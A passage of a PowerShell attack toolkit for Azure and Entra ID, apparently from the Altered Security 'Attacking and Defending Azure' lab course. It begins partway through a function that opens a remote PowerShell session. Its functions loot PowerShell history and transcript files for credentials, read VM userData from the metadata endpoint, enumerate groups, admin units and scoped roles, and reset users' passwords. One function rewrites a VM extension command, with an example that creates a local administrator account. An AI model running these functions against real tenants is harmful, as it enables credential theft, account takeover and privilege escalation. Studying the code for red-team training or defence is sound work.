    $publicIpAddress = (Get-AzPublicIpAddress -Name $networkIpName).IpAddress

    # Convert password to a secure string and create credentials
    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential($Username, $securePassword)

    # Establish a PowerShell session
    try {
        $session = New-PSSession -ComputerName $publicIpAddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
        Enter-PSSession $session
    } catch {
        Write-Error "Failed to establish a session with the VM. Error: $_"
    }
}


function Get-MgApplicationProxyApplication {
# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

 param (
        [Parameter(Mandatory = $true)]
        [string]$GraphToken
    )

if (-not $GraphToken) {
    Write-Host "[+] Failed to retrieve access token." -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Access token retrieved successfully." -ForegroundColor Green
}

$applicationsUrl = "https://graph.microsoft.com/beta/applications"

Write-Host "Retrieving applications from Microsoft Graph..." -ForegroundColor Cyan
$applications = Invoke-RestMethod -Uri $applicationsUrl -Headers @{ Authorization = "Bearer $GraphToken" }

if (-not $applications) {
	Write-Host "[-] No applications found or failed to retrieve applications." -ForegroundColor Red
    exit
} else {
    Write-Host "[+] Successfully retrieved applications." -ForegroundColor Green
}

foreach ($application in $applications.value) {
    $objectId = $application.id
    $displayName = $application.displayName

    try {
        $proxyUrl = "$applicationsUrl/$objectId/onPremisesPublishing"

        $proxyDetail = Invoke-RestMethod -Uri $proxyUrl -Method Get -Headers @{ Authorization = "Bearer $GraphToken" }

        if ($proxyDetail) {
			Write-Host ""
            Write-Host "Application Proxy used by application: '$displayName'" -ForegroundColor White
            Write-Host "External URL: $($proxyDetail.externalUrl)" -ForegroundColor White
            Write-Host "Internal URL: $($proxyDetail.internalUrl)" -ForegroundColor White
            Write-Host "ServicePrincipal ID: $( (Get-MgServicePrincipal -Filter "DisplayName eq '$displayName'" ).id)" -ForegroundColor Cyan
            Write-Host "External Authentication Type: $($proxyDetail.externalAuthenticationType)" -ForegroundColor White
        } else {
        }
    } catch {
    }
}
}

function Carp-VmCredLoot{
    print_output("Searching ConsoleHost_history.txt file")
    Get-ChildItem -Path "C:\Users\" -Recurse -Filter "ConsoleHost_history.txt" -ErrorAction SilentlyContinue | ForEach-Object { 
    Write-Host "Found file at: $($_.FullName)"
    Get-Content $_.FullName
        }

    print_output("Looting in PowerShell Transcript")
    cat (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Get-ChildItem -Path "C:\" -Recurse -Include *PowerShell_transcript*.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`nPath: $($_.FullName)" -ForegroundColor Yellow; Get-Content $_.FullName | Write-Host -ForegroundColor Cyan }

    print_output("Extract user data used by vm")
    $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

}

function Carp-GetGroupInfoAndMember {
    param (
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )

    # Retrieve the group details
    try {
        $groupInfo = Get-AzADGroup -DisplayName $GroupName
        Write-Output "Group Information:"
        $groupInfo | Format-List
    } catch {
        Write-Error "Failed to retrieve the group details for '$GroupName'. Error: $_"
        return
    }

    # Initialize an array to store user details
    $userDetailsList = @()

    # Get the members of the group
    try {
        $groupMembers = Get-AzADGroupMember -GroupDisplayName $GroupName
    } catch {
        Write-Error "Failed to retrieve the group members for '$GroupName'. Error: $_"
        return
    }

    # Iterate over each member to get detailed user information
    foreach ($member in $groupMembers) {
        try {
            # Fetch detailed user info based on the object ID
            $userDetails = Get-AzADUser -ObjectId $member.Id

            # Add details to the array as a custom object
            $userDetailsList += [pscustomobject]@{
                DisplayName        = $userDetails.DisplayName
                Email              = $userDetails.Mail
                UserPrincipalName  = $userDetails.UserPrincipalName
                ObjectId           = $userDetails.Id
            }
        } catch {
            Write-Warning "Failed to retrieve user details for member ID '$($member.Id)'. Error: $_"
        }
    }

    # Output the results in a table format
    if ($userDetailsList.Count -gt 0) {
        Write-Output "Group Members Information:"
        $userDetailsList | Format-Table -AutoSize
    } else {
        Write-Output "No members found in the group '$GroupName' or unable to retrieve member details."
    }
}

function Carp-GetUserGroups {
    
    param(
        [string]$UserEmail,       # The email of the user whose groups you want to retrieve
        [string]$GraphToken = ""  # Optional parameter for the Graph token
    )

    print_output(("User "+$UserEmail+" groups enumeration"))
    
    # If the graphToken is not provided, obtain it
    if (-not $GraphToken) {
        $GraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction SilentlyContinue).Token

        # Check if the token was successfully obtained
        if (-not $GraphToken -or $GraphToken -eq "") {
            Write-Host "Failed to obtain Graph token. Please ensure you are authenticated and try again." -ForegroundColor Red
            return
        }
    }

    # Construct the request URI for the user's groups
    $URI = "https://graph.microsoft.com/v1.0/users/$UserEmail/memberOf"

    # Set up the request parameters
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $graphToken"
        }
    }

    # Fetch the results
    try {
        $results = (Invoke-RestMethod @RequestParams).value

        # Process and format the results into a table
        $results | ForEach-Object {
            [pscustomobject]@{
                ODataType   = $_.'@odata.type'.replace("#microsoft.graph.", "")
                DisplayName = $_.displayName
                Description = $_.description
                ID          = $_.id
            }
        } | Format-Table -AutoSize


        try {

            # Filter results for unique administrativeUnit types
            $adminUnits = $results | Where-Object { $_.'@odata.type' -like "*administrativeUnit*" } |
                        Select-Object -Unique -Property id, '@odata.type'

            if ($adminUnits) {
                foreach ($adminUnit in $adminUnits) {
                    # Extract ID of each administrativeUnit
                    $adminUnitId = $adminUnit.id
                    
                    # Call the Carp-GetAdministrativeUnit function with the extracted ID
                    Carp-GetAdministrativeUnit -AdminUnitId $adminUnitId
                }
            } 
        }
        catch {
            Write-Host "Error while getting information on AdministrativeUnit" -ForegroundColor Red
        }


    }
    catch {
        Write-Host "Failed to retrieve user groups. Please check the user email and try again." -ForegroundColor Red
    }
}

function Carp-GetAdministrativeUnit {
    param(
        [string]$AdminUnitId,     # The ID of the Administrative Unit
        [string]$GraphToken = ""  # Optional parameter for the Graph token
    )

    print_output(("Information of AdministrativeUnit "+$AdminUnitId))
    # If the graphToken is not provided, obtain it
    if (-not $GraphToken) {
        $GraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction SilentlyContinue).Token

        # Check if the token was successfully obtained
        if (-not $GraphToken ) {
            Write-Host "Failed to obtain Graph token. Please ensure you are authenticated and try again." -ForegroundColor Red
            return
        }
    }


    # Get details of the Administrative Unit
    try {
        Write-Host "Retrieving Administrative Unit details..."
        $adminUnitDetails = Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId $AdminUnitId -ErrorAction SilentlyContinue

        if (-not $adminUnitDetails) {
            Write-Host "Failed to retrieve Administrative Unit details. Please check the AdminUnitId." -ForegroundColor Red
            return
        }

        # Display Administrative Unit details
        $adminUnitDetails | Format-List
    }
    catch {
        Write-Host "Error retrieving Administrative Unit details." -ForegroundColor Red
        return
    }

    # Get members of the Administrative Unit
    try {
        Write-Host "Retrieving Administrative Unit members..."
        $adminUnitMembers = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $AdminUnitId -ErrorAction SilentlyContinue

        if ($adminUnitMembers) {
            $adminUnitMembers | Format-List
        }
        else {
            Write-Host "No members found in the Administrative Unit." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving Administrative Unit members." -ForegroundColor Red
    }

    # Get roles scoped to the Administrative Unit
    try {
        Write-Host "Retrieving scoped role members for the Administrative Unit..."
        $scopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $AdminUnitId -ErrorAction SilentlyContinue

        if ($scopedRoleMembers) {
            # Initialize an array to store combined details
            $combinedDetails = @()

            # Process each scoped role member
            foreach ($member in $scopedRoleMembers) {
                $roleDetails = Get-MgDirectoryRole -DirectoryRoleId $member.RoleId -ErrorAction SilentlyContinue
                $userDetails = Get-MgUser -UserId $member.RoleMemberInfo.Id -ErrorAction SilentlyContinue

                # Add combined information to the array
                $combinedDetails += [pscustomobject]@{
                    RoleMemberName  = $member.RoleMemberInfo.DisplayName
                    Email           = $userDetails.Mail
                    RoleMemberId    = $member.RoleMemberInfo.Id
                    RoleName        = $roleDetails.DisplayName
                    RoleDescription = $roleDetails.Description
                    RoleId          = $roleDetails.Id
                }
            }

            # Display the combined details in a table
            $combinedDetails | Format-List
        }
        else {
            Write-Host "No scoped roles found for the Administrative Unit." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving scoped role members." -ForegroundColor Red
    }
}

function Carp-SetUserPass {
    param(
        [string]$UserEmail,        # Email of the user whose password will be changed
        [string]$NewPassword       # New password to set
    )

    # Prepare the parameters for the password update
    $params = @{
        passwordProfile = @{
            forceChangePasswordNextSignIn = $false
            password = $NewPassword
        }
    }

    try {
        # Update the user's password
        Update-MgUser -UserId $UserEmail -BodyParameter $params -Verbose
        Write-Host "Password updated successfully for $UserEmail." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to update password for $UserEmail. Please check the inputs and try again." -ForegroundColor Red
    }
}

function Carp-AzVmExtensionsEditCommandToExecute {

    <#
    .SYNOPSIS
    Updates the command to execute for a given Azure VM extension.

    .DESCRIPTION
    This function takes a VM extension object and a command string, then updates the VM extension to execute the specified command.

    .PARAMETER VmExtension
    The VM extension object, typically retrieved via `Get-AzResource`.

    .PARAMETER CommandToExecute
    The command string to be executed by the VM extension.

    .EXAMPLE
    $vmExtension = (Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions")[0]
    Carp-AzVmExtensionsEditCommandToExecute -VmExtension $vmExtension -CommandToExecute "powershell net users student13 Stud13Password@123 /add /Y; net localgroup administrators student13 /add"

    This example retrieves the first VM extension and updates it to add a new user and promote them to the administrators group.
    #>

    param(
        [object]$VmExtension,       # Object representing the VM extension
        [string]$CommandToExecute   # Command to be executed
    )


    # Build the settings JSON string with properly escaped quotes
    $settingsJson = @"
{
    "commandToExecute": "$CommandToExecute"
}
"@

    # Extract VM Name and Extension Name from the Resource ID
    $vmName = (($VmExtension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/")[0]
    $vmExtensionName = $VmExtension.Name

    # Get the detailed VM extension information
    $extension = Get-AzVMExtension -ResourceGroupName $VmExtension.ResourceGroupName -VMName $vmName -Name $vmExtensionName

    if ($null -eq $extension) {
        Write-Host "Detailed extension information not found for $VmExtension." -ForegroundColor Red
        return
    }

    # Extract necessary details from the extension
    $vmPublisher = $extension.Publisher
    $vmExtensionType = $extension.ExtensionType
    $TypeHandlerVersion = $extension.TypeHandlerVersion

    # Update the VM extension with the new command to execute
    try {
        Set-AzVMExtension `
            -ResourceGroupName $VmExtension.ResourceGroupName `
            -ExtensionName $vmExtensionName `
            -VMName $vmName `
            -Location $VmExtension.Location `
            -Publisher $vmPublisher `
            -ExtensionType $vmExtensionType `
            -TypeHandlerVersion $TypeHandlerVersion `
            -SettingString $settingsJson
        
        Write-Host "Successfully updated the command to execute for VM extension $vmExtensionName." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to update the VM extension. Error: $_" -ForegroundColor Red
    }
}

function Carp-GetDynamicGroup{
    #Connect-MgGraph -Scopes "Group.Read.All"

    # Get all groups with dynamic membership rules
    $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')"

    # Iterate through each dynamic group
    foreach ($group in $dynamicGroups) {
        Write-Host "Group Name: $($group.DisplayName)" -ForegroundColor Cyan
        Write-Host "Group ID: $($group.Id)"
        
        # Display dynamic membership rules
        if ($group.MembershipRule) {
            Write-Host "Dynamic Membership Rule: $($group.MembershipRule)" -ForegroundColor Green
            Write-Host "Rule Processing State: $($group.MembershipRuleProcessingState)" -ForegroundColor Yellow
        } else {
            Write-Host "No dynamic membership rule found for this group." -ForegroundColor Red
        }
        
        # Fetch members of the dynamic group
        Write-Host "Group Members:" -ForegroundColor Magenta
        $members = Get-MgGroupMember -GroupId $group.Id -All
        
        # Display members
        foreach ($member in $members) {
            Write-Host " - $($member.DisplayName) ($($member.Id))"
        }
        
        Write-Host "`n" # New line for readability
    }
}

function Carp-Convert-ToGuestEmail {

    <#
    .SYNOPSIS
    Converts a user email into the Azure AD B2B guest email format.

    .DESCRIPTION
    This function takes a standard user email and a domain as inputs and converts the email into 
    the guest email format required by Azure AD B2B. The guest email is constructed by replacing 
    the domain separator with an underscore and appending the Azure AD domain.

    .PARAMETER UserEmail
    The email address of the user that needs to be converted into the guest email format.

    .PARAMETER Domain
    The Azure AD domain where the guest user will be added. This domain will be appended 
    to the guest email in the format of `onmicrosoft.com`.

    .EXAMPLE
    Carp-Convert-ToGuestEmail -UserEmail "hobawa1189@evnft.com" -Domain "defcorpextcontractors"

    This will return:
    "hobawa1189_evnft.com#EXT#@defcorpextcontractors.onmicrosoft.com"

    #>

    param (
        [Parameter(Mandatory=$true)]
        [string]$UserEmail,

        [Parameter(Mandatory=$true)]
        [string]$Domain
    )

    # Split the email into username and domain
    $username, $userDomain = $UserEmail -split '@'

    # Replace the '@' in the domain part with an underscore
    $sanitizedDomain = $userDomain -replace '@', '_'

    # Construct the guest email address
    $guestEmail = "${username}_${sanitizedDomain}#EXT#@${Domain}.onmicrosoft.com"

    return $guestEmail
}